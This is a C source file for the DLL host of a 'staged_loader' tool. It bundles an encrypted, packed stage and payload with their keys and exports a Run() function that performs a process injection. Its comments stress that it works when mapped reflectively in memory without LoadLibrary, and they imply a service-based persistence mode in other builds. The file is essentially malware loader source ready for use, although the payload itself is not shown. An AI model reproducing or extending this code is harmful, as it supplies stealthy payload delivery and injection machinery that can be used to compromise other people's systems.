/*
 * staged_loader DLL host.
 *
 * Built as `dll`, this wraps the same packed stage in a DLL instead of an
 * executable. It exports:
 *
 *   int __cdecl Run(void)       run one foreground injection
 *   int __cdecl SelfTest(void)  run the stage selftest (0 on success)
 *
 * Any loader that can map a PE and call a named export can use it. Because
 * the packed artifacts live in a data section (stage_data.S) rather than in
 * RCDATA resources, the exports work even when the DLL is mapped in memory
 * instead of loaded with LoadLibrary.
 *
 * The stage is built with STAGED_LOADER_NO_SERVICE, so a bare Run() performs one
 * injection and never touches the service manager.
 */
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>

#include "bootstrap.h"
#include "stage_data.h"

static int run_stage(int argc, wchar_t **argv) {
  return staged_loader_bootstrap(
      staged_loader_stage_start, (size_t)(staged_loader_stage_end - staged_loader_stage_start),
      staged_loader_stage_key_start, (size_t)(staged_loader_stage_key_end - staged_loader_stage_key_start),
      staged_loader_payload_start, (size_t)(staged_loader_payload_end - staged_loader_payload_start),
      staged_loader_key_start, (size_t)(staged_loader_key_end - staged_loader_key_start), argc, argv);
}

__declspec(dllexport) int __cdecl Run(void) {
  wchar_t *argv[] = {L"staged_loader"};
  return run_stage(1, argv);
}

__declspec(dllexport) int __cdecl SelfTest(void) {
  wchar_t *argv[] = {L"staged_loader", L"--selftest"};
  return run_stage(2, argv);
}

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
  (void)reserved;
  if (reason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(inst);
  }
  return TRUE;
}
